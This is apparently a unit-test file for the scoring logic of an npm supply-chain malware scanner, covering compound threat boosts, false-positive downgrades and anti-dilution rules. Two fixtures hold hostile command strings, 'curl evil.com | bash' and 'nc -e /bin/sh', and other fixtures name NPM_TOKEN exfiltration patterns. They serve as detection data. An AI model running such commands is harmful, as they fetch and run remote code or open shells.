'use strict';

const { test, assert } = require('../test-utils');
const { applyFPReductions, applyCompoundBoosts } = require('../../src/scoring.js');
const { getRule } = require('../../src/rules/index.js');
const { getPlaybook } = require('../../src/response/playbooks.js');

async function runCompoundScoringTests() {
  console.log('\n=== COMPOUND SCORING TESTS (v2.9.2) ===\n');

  // ===================================================================
  // 1. crypto_staged_payload — staged_binary_payload + crypto_decipher
  // ===================================================================
  test('Compound: crypto_staged_payload — positive (both types present)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref + eval' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'crypto_staged_payload compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.compound === true, 'Should have compound flag');
    assert(compound.file === 'index.js', `File should be index.js, got ${compound.file}`);
  });

  test('Compound: crypto_staged_payload — negative (only staged_binary_payload)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref + eval' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'Should NOT add compound with only one required type');
  });

  test('Compound: crypto_staged_payload — negative (only crypto_decipher)', () => {
    const threats = [
      { type: 'crypto_decipher', severity: 'HIGH', file: 'lib.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'Should NOT add compound with only one required type');
  });

  test('Compound: crypto_staged_payload — no duplicate', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' },
      { type: 'crypto_staged_payload', severity: 'CRITICAL', file: 'index.js', message: 'Already present' }
    ];
    applyCompoundBoosts(threats);
    const compounds = threats.filter(t => t.type === 'crypto_staged_payload');
    assert(compounds.length === 1, `Should not duplicate — got ${compounds.length}`);
  });

  // ===================================================================
  // 2. lifecycle_typosquat — lifecycle_script + typosquat_detected
  // ===================================================================
  test('Compound: lifecycle_typosquat — positive', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'lodash vs lodashs' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(compound, 'lifecycle_typosquat compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'package.json', `File should come from typosquat_detected`);
  });

  test('Compound: lifecycle_typosquat — negative (only lifecycle_script)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(!compound, 'Should NOT add compound with only lifecycle_script');
  });

  test('Compound: lifecycle_typosquat — negative (only typosquat_detected)', () => {
    const threats = [
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'lodash vs lodashs' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(!compound, 'Should NOT add compound with only typosquat_detected');
  });

  // ===================================================================
  // 3. lifecycle_inline_exec — lifecycle_script + node_inline_exec
  // ===================================================================
  test('Compound: lifecycle_inline_exec — positive', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'postinstall' },
      { type: 'node_inline_exec', severity: 'HIGH', file: 'package.json', message: 'node -e' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_inline_exec');
    assert(compound, 'lifecycle_inline_exec compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'package.json', `File should come from node_inline_exec`);
  });

  test('Compound: lifecycle_inline_exec — negative (only lifecycle_script)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'postinstall' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_inline_exec');
    assert(!compound, 'Should NOT add compound with only lifecycle_script');
  });

  // ===================================================================
  // 4. lifecycle_remote_require — lifecycle_script + network_require
  // ===================================================================
  test('Compound: lifecycle_remote_require — positive', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'network_require', severity: 'HIGH', file: 'package.json', message: 'require(https)' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_remote_require');
    assert(compound, 'lifecycle_remote_require compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'package.json', `File should come from network_require`);
  });

  test('Compound: lifecycle_remote_require — negative (only network_require)', () => {
    const threats = [
      { type: 'network_require', severity: 'HIGH', file: 'package.json', message: 'require(https)' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_remote_require');
    assert(!compound, 'Should NOT add compound with only network_require');
  });

  // ===================================================================
  // Disabled compounds — verify they do NOT fire
  // ===================================================================
  test('Disabled: credential_env_exfil does NOT fire (too noisy)', () => {
    const threats = [
      { type: 'credential_tampering', severity: 'CRITICAL', file: 'steal.js', message: 'write to _cacache' },
      { type: 'env_access', severity: 'HIGH', file: 'config.js', message: 'NPM_TOKEN' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'credential_env_exfil');
    assert(!compound, 'credential_env_exfil should be disabled — fires on legitimate SDKs');
  });

  // ===================================================================
  // 5. websocket_credential_exfil — env_access + suspicious_module_sink (v2.10.1 B1 fix)
  // Distinct from credential_env_exfil: only fires on ws/mqtt/socket.io sinks, not HTTP clients
  // ===================================================================
  test('Compound: websocket_credential_exfil — positive (same file)', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', file: 'exfil.js', message: 'NPM_TOKEN' },
      { type: 'suspicious_module_sink', severity: 'MEDIUM', file: 'exfil.js', message: 'ws.send' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'websocket_credential_exfil');
    assert(compound, 'websocket_credential_exfil compound should fire');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'exfil.js', `File should be exfil.js, got ${compound.file}`);
  });

  test('Compound: websocket_credential_exfil — negative (different files)', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', file: 'config.js', message: 'NPM_TOKEN' },
      { type: 'suspicious_module_sink', severity: 'MEDIUM', file: 'server.js', message: 'ws.send' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'websocket_credential_exfil');
    assert(!compound, 'websocket_credential_exfil should NOT fire across files');
  });

  test('Compound: websocket_credential_exfil — negative (only env_access)', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', file: 'config.js', message: 'NPM_TOKEN' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'websocket_credential_exfil');
    assert(!compound, 'Should NOT fire with only env_access');
  });

  test('Compound: websocket_credential_exfil — negative (only suspicious_module_sink)', () => {
    const threats = [
      { type: 'suspicious_module_sink', severity: 'MEDIUM', file: 'server.js', message: 'ws.send' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'websocket_credential_exfil');
    assert(!compound, 'Should NOT fire with only suspicious_module_sink');
  });

  test('Disabled: obfuscated_credential_tampering does NOT fire (too noisy)', () => {
    const threats = [
      { type: 'credential_tampering', severity: 'CRITICAL', file: 'payload.js', message: 'write to _cacache' },
      { type: 'obfuscation_detected', severity: 'HIGH', file: 'payload.js', message: 'obfuscated code' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'obfuscated_credential_tampering');
    assert(!compound, 'obfuscated_credential_tampering should be disabled — fires on minified SDKs');
  });

  // ===================================================================
  // Same-file constraint for crypto_staged_payload
  // ===================================================================
  test('Compound: crypto_staged_payload — cross-file does NOT fire (sameFile constraint)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'dist/compiled/nft/index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'lib/crypto.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'crypto_staged_payload should NOT fire when types are in different files');
  });

  test('Compound: crypto_staged_payload — same file fires (sameFile constraint)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'crypto_staged_payload should fire when both types are in the same file');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  // ===================================================================
  // File assignment tests
  // ===================================================================
  test('Compound: file assignment uses fileFrom component', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'src/main.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'src/main.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'Should add compound');
    assert(compound.file === 'src/main.js', `Should use staged_binary_payload file, got ${compound.file}`);
  });

  // ===================================================================
  // Multiple compounds from same threat types
  // ===================================================================
  test('Compound: multiple compounds can fire from shared types', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'lodash vs lodashs' },
      { type: 'node_inline_exec', severity: 'HIGH', file: 'package.json', message: 'node -e' },
      { type: 'network_require', severity: 'HIGH', file: 'package.json', message: 'require(https)' }
    ];
    applyCompoundBoosts(threats);
    const typosquat = threats.find(t => t.type === 'lifecycle_typosquat');
    const inlineExec = threats.find(t => t.type === 'lifecycle_inline_exec');
    const remoteReq = threats.find(t => t.type === 'lifecycle_remote_require');
    assert(typosquat, 'lifecycle_typosquat should fire');
    assert(inlineExec, 'lifecycle_inline_exec should fire');
    assert(remoteReq, 'lifecycle_remote_require should fire');
  });

  // ===================================================================
  // Empty threats array
  // ===================================================================
  test('Compound: empty threats array — no crash', () => {
    const threats = [];
    applyCompoundBoosts(threats);
    assert(threats.length === 0, 'Should stay empty');
  });

  // ===================================================================
  // No matching compounds
  // ===================================================================
  test('Compound: unrelated threats — no compounds added', () => {
    const threats = [
      { type: 'dynamic_require', severity: 'HIGH', file: 'a.js', message: 'require concat' },
      { type: 'high_entropy_string', severity: 'MEDIUM', file: 'b.js', message: 'entropy' }
    ];
    const originalLength = threats.length;
    applyCompoundBoosts(threats);
    assert(threats.length === originalLength, `Should not add compounds, got ${threats.length - originalLength} extra`);
  });

  // ===================================================================
  // dangerous_exec in dist/ stays exempt (not downgraded)
  // ===================================================================
  test('DIST_EXEMPT: dangerous_exec in dist/ file stays CRITICAL', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'dist/index.js', message: 'curl evil.com | bash' }
    ];
    applyFPReductions(threats, null, null);
    assert(threats[0].severity === 'CRITICAL', `dangerous_exec in dist/ should stay CRITICAL, got ${threats[0].severity}`);
  });

  test('DIST_EXEMPT: dangerous_exec in build/ file stays CRITICAL', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'build/bundle.js', message: 'nc -e /bin/sh' }
    ];
    applyFPReductions(threats, null, null);
    assert(threats[0].severity === 'CRITICAL', `dangerous_exec in build/ should stay CRITICAL, got ${threats[0].severity}`);
  });

  // ===================================================================
  // Compound types in dist/ — components downgraded to LOW by DIST_BUNDLER_ARTIFACT_TYPES
  // ===================================================================
  test('DIST_BUNDLER: crypto_staged_payload fires in dist/ (originalSeverity gate, v2.9.6)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'dist/main.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'dist/main.js', message: 'createDecipher' }
    ];
    applyFPReductions(threats, null, null);
    // After FP reductions, both are LOW (two-notch downgrade in dist/)
    assert(threats[0].severity === 'LOW', `staged_binary_payload should be LOW in dist/, got ${threats[0].severity}`);
    assert(threats[1].severity === 'LOW', `crypto_decipher should be LOW in dist/, got ${threats[1].severity}`);
    // But originalSeverity is still HIGH (set before FP reductions)
    assert(threats[0].originalSeverity === 'HIGH', `originalSeverity should be HIGH, got ${threats[0].originalSeverity}`);
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    // v2.9.6: compound NOW fires — originalSeverity gate prevents attackers from
    // placing code in dist/ to evade compound detection (GAP 4b hardening).
    assert(compound, 'crypto_staged_payload should fire — originalSeverity was HIGH');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  test('DIST_BUNDLER: crypto_staged_payload fires at root (components stay HIGH)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' }
    ];
    applyFPReductions(threats, null, null);
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'crypto_staged_payload should fire at root (not in dist/)');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  // ===================================================================
  // Rules and playbooks exist for all 4 active compound types
  // ===================================================================
  test('Rules: all 5 active compound rules exist with correct IDs', () => {
    const compoundTypes = [
      'crypto_staged_payload', 'lifecycle_typosquat',
      'lifecycle_inline_exec', 'lifecycle_remote_require',
      'websocket_credential_exfil'
    ];
    for (const type of compoundTypes) {
      const rule = getRule(type);
      assert(rule.id !== 'MUADDIB-UNK-001', `Rule for ${type} should exist, got unknown`);
      assert(rule.id.startsWith('MUADDIB-COMPOUND-'), `Rule ID for ${type} should start with MUADDIB-COMPOUND-, got ${rule.id}`);
      assert(rule.severity === 'CRITICAL', `Rule severity for ${type} should be CRITICAL, got ${rule.severity}`);
      assert(rule.confidence === 'high', `Rule confidence for ${type} should be high, got ${rule.confidence}`);
    }
  });

  test('Playbooks: all 5 active compound playbooks exist', () => {
    const compoundTypes = [
      'crypto_staged_payload', 'lifecycle_typosquat',
      'lifecycle_inline_exec', 'lifecycle_remote_require',
      'websocket_credential_exfil'
    ];
    for (const type of compoundTypes) {
      const playbook = getPlaybook(type);
      assert(playbook !== 'Analyser manuellement cette menace.',
        `Playbook for ${type} should exist, got default`);
      assert(playbook.includes('CRITIQUE'), `Playbook for ${type} should contain CRITIQUE`);
    }
  });

  // ===================================================================
  // Severity gate: compound blocked when ALL components are LOW
  // ===================================================================
  test('Severity gate: crypto_staged_payload blocked when both LOW', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'LOW', file: 'a.js', message: 'bin' },
      { type: 'crypto_decipher', severity: 'LOW', file: 'a.js', message: 'decipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'Should NOT fire when all components are LOW');
  });

  test('Severity gate: fires when one component is MEDIUM and other is LOW', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'LOW', file: 'a.js', message: 'bin' },
      { type: 'crypto_decipher', severity: 'MEDIUM', file: 'a.js', message: 'decipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'Should fire when at least one component is >= MEDIUM');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  test('Severity gate: lifecycle compounds pass (lifecycle_script MEDIUM counts)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'LOW', file: 'package.json', message: 'typo' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(compound, 'lifecycle_typosquat should fire because lifecycle_script is MEDIUM');
  });

  // ===================================================================
  // Compound count field
  // ===================================================================
  test('Compound: injected threats have count=1', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'typo' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(compound.count === 1, `Count should be 1, got ${compound.count}`);
  });

  // ===================================================================
  // Audit v3 B4: Count-threshold dilution immunity for dangerous modules
  // ===================================================================
  console.log('\n  --- Audit v3 B4/B5: Anti-dilution protections ---\n');

  test('B4: dynamic_require targeting child_process is immune to count-threshold dilution', () => {
    // Simulate attacker injecting 12 benign dynamic_require + 1 targeting child_process
    const threats = [];
    for (let i = 0; i < 12; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `loader${i}.js`, message: 'Dynamic require() with variable argument (module name obfuscation).' });
    }
    threats.push({ type: 'dynamic_require', severity: 'HIGH', file: 'malicious.js', message: 'Object property indirection: cp = require(\'child_process\') — hiding dangerous module in object property.' });
    // Add some other threats to bring typeRatio < 0.4
    for (let i = 0; i < 25; i++) {
      threats.push({ type: 'env_access', severity: 'HIGH', file: `config${i}.js`, message: `Access to env var ${i}` });
    }
    applyFPReductions(threats);
    // The child_process instance should retain HIGH
    const cpThreat = threats.find(t => t.type === 'dynamic_require' && t.message.includes('child_process'));
    assert(cpThreat.severity === 'HIGH', `child_process dynamic_require should stay HIGH, got ${cpThreat.severity}`);
    // Generic dynamic_require should be downgraded to LOW
    const genericThreats = threats.filter(t => t.type === 'dynamic_require' && !t.message.includes('child_process'));
    const allLow = genericThreats.every(t => t.severity === 'LOW');
    assert(allLow, 'Generic dynamic_require should be downgraded to LOW');
  });

  test('B4: dynamic_require targeting dns/net/http is also immune', () => {
    const threats = [];
    for (let i = 0; i < 12; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `loader${i}.js`, message: 'Dynamic require() with variable argument.' });
    }
    threats.push({ type: 'dynamic_require', severity: 'HIGH', file: 'exfil.js', message: 'require(x) resolves to "dns" via variable reassignment.' });
    for (let i = 0; i < 25; i++) {
      threats.push({ type: 'obfuscation_detected', severity: 'MEDIUM', file: `obf${i}.js`, message: 'obf' });
    }
    applyFPReductions(threats);
    const dnsThreat = threats.find(t => t.type === 'dynamic_require' && t.message.includes('dns'));
    assert(dnsThreat.severity === 'HIGH', `dns dynamic_require should stay HIGH, got ${dnsThreat.severity}`);
  });

  // ===================================================================
  // Audit v3 B5: env_access immunity when network sink is in same file
  // ===================================================================
  test('B5: env_access in same file as network sink is immune to count-threshold', () => {
    // 12 env_access in config files + 1 in file with network sink
    const threats = [];
    for (let i = 0; i < 12; i++) {
      threats.push({ type: 'env_access', severity: 'HIGH', file: `config${i}.js`, message: `Access to env var CONFIG_${i}` });
    }
    threats.push({ type: 'env_access', severity: 'HIGH', file: 'exfil.js', message: 'Access to NPM_TOKEN' });
    threats.push({ type: 'suspicious_module_sink', severity: 'MEDIUM', file: 'exfil.js', message: 'ws.send' });
    // Padding to bring typeRatio < 0.4
    for (let i = 0; i < 25; i++) {
      threats.push({ type: 'obfuscation_detected', severity: 'MEDIUM', file: `obf${i}.js`, message: 'obf' });
    }
    applyFPReductions(threats);
    // The exfil.js env_access should retain HIGH (same file as network sink)
    const exfilEnv = threats.find(t => t.type === 'env_access' && t.file === 'exfil.js');
    assert(exfilEnv.severity === 'HIGH', `env_access in exfil.js should stay HIGH, got ${exfilEnv.severity}`);
    // Config env_access should be downgraded to LOW
    const configEnvs = threats.filter(t => t.type === 'env_access' && t.file.startsWith('config'));
    const allLow = configEnvs.every(t => t.severity === 'LOW');
    assert(allLow, 'Config env_access should be downgraded to LOW');
  });

  test('B5: env_access without network sink in same file is still downgraded', () => {
    const threats = [];
    for (let i = 0; i < 12; i++) {
      threats.push({ type: 'env_access', severity: 'HIGH', file: `config${i}.js`, message: `Access to env var CONFIG_${i}` });
    }
    // Network sink in a DIFFERENT file
    threats.push({ type: 'suspicious_module_sink', severity: 'MEDIUM', file: 'other.js', message: 'ws.send' });
    for (let i = 0; i < 25; i++) {
      threats.push({ type: 'obfuscation_detected', severity: 'MEDIUM', file: `obf${i}.js`, message: 'obf' });
    }
    applyFPReductions(threats);
    const configEnvs = threats.filter(t => t.type === 'env_access');
    const allLow = configEnvs.every(t => t.severity === 'LOW');
    assert(allLow, 'All env_access should be LOW when no network sink in same file');
  });

  // ===================================================================
  // AUDIT V3 BLOC 3: FP Reduction Tests
  // ===================================================================

  console.log('\n  --- Audit v3 Bloc 3: FP Reduction ---\n');

  // FP Fix 1: credential_regex_harvest — no dilution floor
  test('FP-B3-1: credential_regex_harvest >2 instances → ALL go LOW (no dilution floor)', () => {
    const threats = [];
    for (let i = 0; i < 5; i++) {
      threats.push({ type: 'credential_regex_harvest', severity: 'HIGH', file: `lib/auth${i}.js`, message: 'regex' });
    }
    applyFPReductions(threats);
    const highInstances = threats.filter(t => t.type === 'credential_regex_harvest' && t.severity === 'HIGH');
    assert(highInstances.length === 0, `Expected 0 HIGH credential_regex_harvest (dilution floor removed), got ${highInstances.length}`);
    const lowInstances = threats.filter(t => t.type === 'credential_regex_harvest' && t.severity === 'LOW');
    assert(lowInstances.length === 5, `Expected all 5 instances to be LOW, got ${lowInstances.length}`);
  });

  test('FP-B3-1: credential_regex_harvest ≤2 instances → stays at original severity', () => {
    const threats = [
      { type: 'credential_regex_harvest', severity: 'HIGH', file: 'index.js', message: 'regex' },
      { type: 'credential_regex_harvest', severity: 'HIGH', file: 'lib.js', message: 'regex' }
    ];
    applyFPReductions(threats);
    const highCount = threats.filter(t => t.type === 'credential_regex_harvest' && t.severity === 'HIGH').length;
    assert(highCount === 2, `Expected 2 HIGH credential_regex_harvest when count ≤ 2, got ${highCount}`);
  });

  // FP Fix 2: prototype_hook — framework prototypes → MEDIUM, count >10 → LOW
  test('FP-B3-2: prototype_hook targeting WebSocket.prototype → MEDIUM (framework pattern)', () => {
    const threats = [
      { type: 'prototype_hook', severity: 'HIGH', file: 'lib/ws.js', message: 'WebSocket.prototype.send' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'MEDIUM', `Expected MEDIUM for WebSocket prototype, got ${threats[0].severity}`);
  });

  test('FP-B3-2: prototype_hook targeting EventEmitter.prototype → MEDIUM', () => {
    const threats = [
      { type: 'prototype_hook', severity: 'HIGH', file: 'lib/events.js', message: 'EventEmitter.prototype.on' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'MEDIUM', `Expected MEDIUM for EventEmitter prototype, got ${threats[0].severity}`);
  });

  test('FP-B3-2: >10 prototype_hook instances → all LOW', () => {
    const threats = [];
    for (let i = 0; i < 15; i++) {
      threats.push({ type: 'prototype_hook', severity: 'HIGH', file: `lib/mod${i}.js`, message: `SomeClass.prototype.method${i}` });
    }
    applyFPReductions(threats);
    const lowCount = threats.filter(t => t.type === 'prototype_hook' && t.severity === 'LOW').length;
    assert(lowCount === 15, `Expected all 15 instances to be LOW when count > 10, got ${lowCount}`);
  });

  test('FP-B3-2: ≤10 prototype_hook instances (non-framework) → stays HIGH', () => {
    const threats = [];
    for (let i = 0; i < 5; i++) {
      threats.push({ type: 'prototype_hook', severity: 'HIGH', file: `lib/mod${i}.js`, message: `SomeClass.prototype.method${i}` });
    }
    applyFPReductions(threats);
    const highCount = threats.filter(t => t.type === 'prototype_hook' && t.severity === 'HIGH').length;
    assert(highCount === 5, `Expected 5 HIGH prototype_hook when count ≤ 10, got ${highCount}`);
  });

  // FP Fix 3: lifecycle_script — benign build commands → LOW
  test('FP-B3-3: lifecycle_script with node-gyp → LOW', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'Script "install" detected: node-gyp rebuild' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'LOW', `Expected LOW for node-gyp lifecycle, got ${threats[0].severity}`);
  });

  test('FP-B3-3: lifecycle_script with husky → LOW', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'Script "prepare" detected: husky install' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'LOW', `Expected LOW for husky lifecycle, got ${threats[0].severity}`);
  });

  test('FP-B3-3: lifecycle_script with node xxx.js → stays MEDIUM (suspicious)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'Script "preinstall" detected: node setup.js' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'MEDIUM', `Expected MEDIUM for generic node lifecycle, got ${threats[0].severity}`);
  });

  test('FP-B3-3: lifecycle_script with prebuild-install → LOW', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'Script "install" detected: prebuild-install || node-gyp rebuild' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'LOW', `Expected LOW for prebuild lifecycle, got ${threats[0].severity}`);
  });

  // --- Typosquat confidence-based downgrade ---

  test('FP-B3-4: typosquat LOW confidence → MEDIUM severity', () => {
    const threats = [
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json',
        message: 'Package "xcolor" resembles popular package "colors" (Confidence: LOW)' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'MEDIUM',
      `LOW confidence typosquat should be MEDIUM, got ${threats[0].severity}`);
  });

  test('FP-B3-4: typosquat HIGH confidence stays HIGH', () => {
    const threats = [
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json',
        message: 'Package "colrs" resembles popular package "colors" (Confidence: HIGH)' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'HIGH',
      `HIGH confidence typosquat should stay HIGH, got ${threats[0].severity}`);
  });

  test('FP-B3-4: typosquat CRITICAL confidence stays HIGH', () => {
    const threats = [
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json',
        message: 'Package "co1ors" resembles popular package "colors" (Confidence: CRITICAL)' }
    ];
    applyFPReductions(threats);
    assert(threats[0].severity === 'HIGH',
      `CRITICAL confidence typosquat should stay HIGH, got ${threats[0].severity}`);
  });

  // --- Bloc 4: Dangerous module immunity ---

  test('B4: dynamic_require targeting child_process stays HIGH despite count > maxCount', () => {
    const threats = [];
    // 15 dynamic_require instances: one targets child_process
    threats.push({ type: 'dynamic_require', severity: 'HIGH', file: 'a.js', message: 'Dynamic require of child_process' });
    for (let i = 0; i < 14; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `lib/mod${i}.js`, message: `Dynamic require of ./plugin${i}` });
    }
    // Add other threats to keep ratio < 40%
    for (let i = 0; i < 30; i++) {
      threats.push({ type: 'env_access', severity: 'MEDIUM', file: `cfg${i}.js`, message: `env ${i}` });
    }
    applyFPReductions(threats);
    const cpThreat = threats.find(t => t.type === 'dynamic_require' && t.message.includes('child_process'));
    assert(cpThreat.severity === 'HIGH',
      `dynamic_require targeting child_process should stay HIGH, got ${cpThreat.severity}`);
  });

  test('B4: dynamic_require targeting net stays HIGH despite count > maxCount', () => {
    const threats = [];
    threats.push({ type: 'dynamic_require', severity: 'HIGH', file: 'a.js', message: 'Dynamic require of net' });
    for (let i = 0; i < 14; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `lib/mod${i}.js`, message: `Dynamic require of ./plugin${i}` });
    }
    for (let i = 0; i < 30; i++) {
      threats.push({ type: 'env_access', severity: 'MEDIUM', file: `cfg${i}.js`, message: `env ${i}` });
    }
    applyFPReductions(threats);
    const netThreat = threats.find(t => t.type === 'dynamic_require' && t.message.includes(' net'));
    assert(netThreat.severity === 'HIGH',
      `dynamic_require targeting net should stay HIGH, got ${netThreat.severity}`);
  });

  test('B4: dynamic_require targeting ./plugin goes LOW when count > maxCount', () => {
    const threats = [];
    for (let i = 0; i < 15; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `lib/mod${i}.js`, message: `Dynamic require of ./plugin${i}` });
    }
    for (let i = 0; i < 30; i++) {
      threats.push({ type: 'env_access', severity: 'MEDIUM', file: `cfg${i}.js`, message: `env ${i}` });
    }
    applyFPReductions(threats);
    const pluginThreats = threats.filter(t => t.type === 'dynamic_require');
    const lowCount = pluginThreats.filter(t => t.severity === 'LOW').length;
    assert(lowCount === 15, `All 15 non-dangerous dynamic_require should be LOW, got ${lowCount}`);
  });

  // --- Bloc 3 edge cases: FP reduction precision ---

  test('FP-B3-5: credential_regex_harvest count > 2 → ALL go LOW (no dilution floor)', () => {
    const threats = [];
    for (let i = 0; i < 5; i++) {
      threats.push({ type: 'credential_regex_harvest', severity: 'HIGH', file: `f${i}.js`, message: `Regex ${i}` });
    }
    for (let i = 0; i < 10; i++) {
      threats.push({ type: 'env_access', severity: 'MEDIUM', file: `cfg${i}.js`, message: `env ${i}` });
    }
    applyFPReductions(threats);
    const crh = threats.filter(t => t.type === 'credential_regex_harvest');
    const highCount = crh.filter(t => t.severity === 'HIGH').length;
    assert(highCount === 0, `No credential_regex_harvest should stay HIGH (no dilution floor), got ${highCount}`);
  });

